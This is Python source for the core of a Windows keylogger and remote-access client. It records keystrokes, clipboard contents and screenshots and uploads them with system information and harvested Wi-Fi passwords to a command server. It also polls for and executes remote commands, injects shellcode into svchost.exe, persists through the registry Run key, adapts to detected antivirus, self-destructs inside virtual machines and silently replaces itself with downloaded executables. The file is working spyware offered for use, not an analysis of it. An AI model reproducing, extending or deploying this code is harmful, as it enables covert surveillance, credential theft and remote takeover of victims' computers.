import threading
import time
import json
import logging
import sys
import platform
import subprocess
import requests
import winreg
from datetime import datetime
from keyboard import hook, add_hotkey
from config import Config
from encryption.manager import EncryptionManager, EncryptionError
from network.communicator import ServerCommunicator, CommunicationError
from system.collector import SystemCollector
from commands.handler import CommandHandler, CommandError
from monitoring.logger import ActivityLogger
from system.process_injector import ProcessInjector
from packaging import version
from PIL import Image
import io
import pyautogui
import os
from system.vm_detector import VMDetector
from monitoring.rdp_controller import RDPController
from system.anti_av import AntiAV

# Configure logging based on DEBUG_MODE
if Config.DEBUG_MODE:
    logging.basicConfig(
        level=logging.DEBUG,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(Config.ERROR_LOG_FILE),
            logging.StreamHandler()
        ]
    )
else:
    logging.getLogger().addHandler(logging.NullHandler())
    logging.getLogger().setLevel(logging.CRITICAL + 1)

class KeyloggerCore:
    def __init__(self):
        try:
            if Config.DEBUG_MODE:
                logging.basicConfig(
                    level=logging.DEBUG,
                    format="%(asctime)s - %(levelname)s - %(message)s",
                    handlers=[
                        logging.FileHandler("keylogger.log", encoding="utf-8"),
                        logging.StreamHandler(sys.stdout),
                    ],
                )
                logging.debug("KeyloggerCore initialization started")

            self.client_id = Config.get_client_id()
            self.encryption = EncryptionManager(Config.ENCRYPTION_KEY)
            self.communicator = ServerCommunicator(self.client_id, self.encryption)
            self.logger = ActivityLogger(Config.BUFFER_LIMIT)
            self.rdp_controller = RDPController(self.encryption)
            self.running = True
            self.anti_av = AntiAV()
            self.running = True
            self.behavior = {
                "screenshot_enabled": True,
                "keylogging_enabled": True,
                "process_injection_enabled": True,
                "rdp_enabled": True,
                "persistence_enabled": True,
                "wifi_passwords_enabled": True
            }

            self.adjust_behavior_based_on_antivirus()

            if platform.system().lower() == "windows" and not Config.DEBUG_MODE and self.behavior["process_injection_enabled"]:
                self.attempt_process_injection()

            self.check_for_updates()
            self.check_vm_environment()
            self.add_to_startup()

        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Initialization error: {str(e)}")
            self.emergency_stop()

    def adjust_behavior_based_on_antivirus(self):
        try:
            antiviruses = self.anti_av.detect_antivirus()
            for av in antiviruses:
                behavior = self.anti_av.adjust_behavior(av)
                self.behavior.update(behavior)
                if Config.DEBUG_MODE:
                    logging.info(f"Adjusted behavior for {av['name']}: {self.behavior}")
                self.communicator.upload_antivirus_status({
                    "antivirus": av,
                    "behavior": self.behavior,
                    "client_id": self.client_id,
                    "timestamp": datetime.now().isoformat()
                })
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Antivirus behavior adjustment error: {str(e)}")

    def attempt_process_injection(self):
        try:
            injector = ProcessInjector()
            pid = injector.find_target_process("svchost.exe")
            if pid:
                shellcode = injector.prepare_shellcode()
                if shellcode and injector.inject_code(pid, shellcode):
                    if Config.DEBUG_MODE:
                        logging.info("Process injection successful. Exiting current process.")
                    sys.exit(0)
                else:
                    if Config.DEBUG_MODE:
                        logging.warning("Process injection failed. Continuing normal execution.")
            else:
                if Config.DEBUG_MODE:
                    logging.warning("No target process found for injection.")
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Process injection error: {str(e)}")

    def check_for_updates(self):
        try:
            if Config.DEBUG_MODE:
                logging.info("Checking for updates...")
            response = self.communicator._send_request(
                "action=check_version",
                data={
                    "client_id": self.client_id,
                    "token": Config.SECRET_TOKEN
                }
            )
            if Config.DEBUG_MODE:
                logging.info(f"Received update response: {response}")

            version_info = response[0] if response else {}
            if 'error' in version_info:
                if Config.DEBUG_MODE:
                    logging.error(f"Version check error: {version_info['error']}")
                return

            server_version = version_info.get('current_version', '0.0')
            download_url = version_info.get('download_url', '')

            if Config.DEBUG_MODE:
                logging.info(f"Current version: {Config.CLIENT_VERSION}, Server version: {server_version}")

            if version.parse(server_version) > version.parse(Config.CLIENT_VERSION):
                if Config.DEBUG_MODE:
                    logging.info(f"New version {server_version} available. Downloading from {download_url}")
                self.update_client(download_url, server_version)
            else:
                if Config.DEBUG_MODE:
                    logging.info("Client is up-to-date.")

        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Update check error: {str(e)}")

    def update_client(self, download_url, new_version):
        try:
            response = self.communicator._send_request(
                "action=download_update",
                data={
                    "client_id": self.client_id,
                    "token": Config.SECRET_TOKEN,
                    "download_url": download_url
                }
            )
            if Config.DEBUG_MODE:
                logging.info(f"Download response: {response}")

            new_exe_path = f"version_{new_version.replace('.', '_')}.exe"
            with open(new_exe_path, 'wb') as f:
                f.write(response.content)
            if Config.DEBUG_MODE:
                logging.info(f"Downloaded new version to {new_exe_path}")

            current_exe = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
            batch_file = "update.bat"

            batch_content = f"""
            @echo off
            ping 127.0.0.1 -n 2 > nul
            del /F /Q "{current_exe}"
            move /Y "{new_exe_path}" "{current_exe}"
            start "" "{current_exe}"
            del /F /Q "%~f0"
            """
            with open(batch_file, 'w', encoding='utf-8') as f:
                f.write(batch_content)

            subprocess.Popen(batch_file, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            if Config.DEBUG_MODE:
                logging.info(f"Created and executed update batch file: {batch_file}")

            sys.exit(0)

        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Update error: {str(e)}")

    def check_vm_environment(self):
        vm_details = VMDetector.get_vm_details()
        if Config.DEBUG_MODE:
            logging.info(f"VM Detection Details: {vm_details}")
        try:
            self.communicator.upload_vm_status(vm_details)
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Failed to upload VM status: {str(e)}")
        if vm_details["is_vm"] and not Config.DEBUG_MODE:
            if Config.DEBUG_MODE:
                logging.warning("Virtual Machine detected. Initiating self-destruct.")
            self.self_destruct()
        elif Config.DEBUG_MODE and vm_details["is_vm"]:
            logging.warning("Virtual Machine detected, but self-destruct skipped in debug mode.")

    def self_destruct(self):
        try:
            if Config.DEBUG_MODE:
                logging.info("Starting self-destruct sequence...")
            try:
                self.communicator.report_self_destruct()
                if Config.DEBUG_MODE:
                    logging.info("Self-destruct report sent to server")
            except Exception as e:
                if Config.DEBUG_MODE:
                    logging.error(f"Failed to send self-destruct report: {str(e)}")
            self.remove_from_startup()
            self.cleanup_files()
            self.delete_executable()
            if Config.DEBUG_MODE:
                logging.info("Self-destruct complete. Terminating process.")
            sys.exit(0)
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Self-destruct error: {str(e)}")
            sys.exit(1)

    def remove_from_startup(self):
        if platform.system().lower() != "windows":
            if Config.DEBUG_MODE:
                logging.info("Startup removal only supported on Windows")
            return
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            app_name = "WindowsSystemService"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as reg_key:
                winreg.DeleteValue(reg_key, app_name)
            if Config.DEBUG_MODE:
                logging.info("Removed from startup registry")
        except FileNotFoundError:
            if Config.DEBUG_MODE:
                logging.info("Startup registry entry not found")
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Failed to remove startup entry: {str(e)}")

    def cleanup_files(self):
        try:
            temp_files = [
                "keylogger.log",
                "screenshot.png"
            ]
            for temp_file in temp_files:
                if os.path.exists(temp_file):
                    os.remove(temp_file)
                    if Config.DEBUG_MODE:
                        logging.info(f"Deleted temporary file: {temp_file}")
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Failed to cleanup files: {str(e)}")

    def delete_executable(self):
        if platform.system().lower() != "windows":
            if Config.DEBUG_MODE:
                logging.info("Executable deletion only supported on Windows")
            return
        try:
            exe_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
            batch_file = "self_destruct.bat"
            batch_content = f"""
            @echo off
            ping 127.0.0.1 -n 2 > nul
            del /F /Q "{exe_path}"
            del /F /Q "%~f0"
            """
            with open(batch_file, "w", encoding="utf-8") as f:
                f.write(batch_content)
            subprocess.Popen(batch_file, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            if Config.DEBUG_MODE:
                logging.info(f"Created and executed self-destruct batch file: {batch_file}")
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Failed to delete executable: {str(e)}")

    def emergency_stop(self):
        self.running = False
        if Config.DEBUG_MODE:
            logging.error("Emergency stop initiated")
        self.self_destruct()

    def start(self):
        self._init_hotkeys()
        self._start_service_threads()
        self._main_loop()

    def add_to_startup(self):
        import os
        import winreg
        import platform
        if platform.system().lower() != 'windows':
            if Config.DEBUG_MODE:
                logging.info("Startup registration only supported on Windows")
            return
        try:
            exe_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "KeyloggerClient", 0, winreg.REG_SZ, exe_path)
            if Config.DEBUG_MODE:
                logging.info("Added to registry startup")
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Failed to add to startup: {str(e)}")

    def _init_hotkeys(self):
        add_hotkey(Config.EMERGENCY_HOTKEY, self.emergency_stop)
        hook(self.logger.log_keystroke)

    def _start_service_threads(self):
        threading.Thread(target=self._data_sync_loop, daemon=True).start()
        threading.Thread(target=self._command_loop, daemon=True).start()
        threading.Thread(target=self._clipboard_monitor_loop, daemon=True).start()
        if self.behavior["wifi_passwords_enabled"]:
            threading.Thread(target=self._wifi_passwords_loop, daemon=True).start()

    def _wifi_passwords_loop(self):
        while True:
            try:
                if self.behavior["wifi_passwords_enabled"]:
                    from commands.handler import CommandHandler
                    wifi_data = CommandHandler.handle_wifi_passwords({})
                    if wifi_data.get("status") == "success" and wifi_data.get("wifi_profiles"):
                        self.communicator.upload_wifi_passwords(wifi_data)
                        if Config.DEBUG_MODE:
                            logging.info("Wi-Fi passwords uploaded successfully")
            except Exception as e:
                if Config.DEBUG_MODE:
                    logging.error(f"Wi-Fi passwords loop error: {str(e)}")
            time.sleep(3600)

    def _capture_screenshot(self):
        try:
            screenshot = pyautogui.screenshot()
            img_byte_arr = io.BytesIO()
            screenshot.save(img_byte_arr, format='PNG')
            return img_byte_arr.getvalue()
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Screenshot capture error: {str(e)}")
            return None

    def _data_sync_loop(self):
        while self.running:
            try:
                if Config.DEBUG_MODE:
                    logging.info("Starting data sync...")
                system_info = SystemCollector.collect_full()
                if Config.DEBUG_MODE:
                    logging.info(f"Collected system info: {system_info}")
                screenshot = self._capture_screenshot()
                self.communicator.upload_data(
                    keystrokes=self.logger.buffer.copy(),
                    system_info=system_info,
                    screenshot=screenshot
                )
                if Config.DEBUG_MODE:
                    logging.info("Data sync completed")
                self.logger.buffer.clear()
                if Config.DEBUG_MODE:
                    logging.info(f"Sleeping for {Config.CHECK_INTERVAL} seconds")
                time.sleep(Config.CHECK_INTERVAL)
            except Exception as e:
                if Config.DEBUG_MODE:
                    logging.error(f"Sync error: {str(e)}")
                time.sleep(5)

    def _command_loop(self):
        while self.running:
            try:
                if Config.DEBUG_MODE:
                    logging.info("Fetching commands from server...")
                commands = self.communicator.fetch_commands()
                if Config.DEBUG_MODE:
                    logging.info(f"Received {len(commands)} commands: {commands}")
                if commands:
                    self._process_commands(commands)
                time.sleep(Config.COMMAND_POLL_INTERVAL)
            except Exception as e:
                if Config.DEBUG_MODE:
                    logging.error(f"Command processing error: {str(e)}")
                time.sleep(5)

    def _clipboard_monitor_loop(self):
        while self.running:
            try:
                self.logger.log_clipboard()
                time.sleep(10)
            except Exception as e:
                if Config.DEBUG_MODE:
                    logging.error(f"Clipboard monitor error: {str(e)}")

    def _process_commands(self, commands):
        for cmd in commands:
            try:
                if Config.DEBUG_MODE:
                    logging.info(f"Processing command: ID={cmd['id']}, Type={cmd['type']}")
                if not all(k in cmd for k in ('id', 'command', 'type')):
                    raise CommandError(f"Invalid command structure: {cmd}")
    
                if Config.DEBUG_MODE:
                    logging.info("Starting decryption")
                decrypted = self.encryption.decrypt(cmd['command'])
                if Config.DEBUG_MODE:
                    logging.info("Decryption successful")
                    logging.info(f"Decrypted command: {decrypted}")
                command_data = json.loads(decrypted)
                if Config.DEBUG_MODE:
                    logging.info(f"Parsed command data: {command_data}")
    
                if 'type' not in command_data:
                    raise CommandError(f"Missing 'type' in decrypted command: {command_data}")
    
                if Config.DEBUG_MODE:
                    logging.info(f"Command received - Type: {command_data['type']}, Params: {command_data.get('params', {})}")
                
                result = CommandHandler.execute(
                    command_data['type'],
                    command_data.get('params', {})
                )
                
                if Config.DEBUG_MODE:
                    logging.info(f"Command executed successfully: {command_data['type']}, Result: {result}")
                self.communicator.send_command_result(cmd['id'], result)
    
            except (KeyError, json.JSONDecodeError) as e:
                if Config.DEBUG_MODE:
                    logging.error(f"Invalid command format: {str(e)}, Command: {cmd}")
            except CommandError as e:
                if Config.DEBUG_MODE:
                    logging.error(f"Command error: {str(e)}, Command: {cmd}")
            except CommunicationError as e:
                if Config.DEBUG_MODE:
                    logging.error(f"Communication error: {str(e)}, Command: {cmd}")
            except Exception as e:
                if Config.DEBUG_MODE:
                    logging.error(f"Command execution failed: {str(e)}, Command: {cmd}")

    def _handle_error(self, message):
        if Config.DEBUG_MODE:
            logging.error(message)

    def emergency_stop(self):
        self.running = False
        if Config.DEBUG_MODE:
            logging.info("Emergency stop activated")
        sys.exit(0)

    def _main_loop(self):
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.emergency_stop()

if __name__ == "__main__":
    keylogger = KeyloggerCore()
    keylogger.start()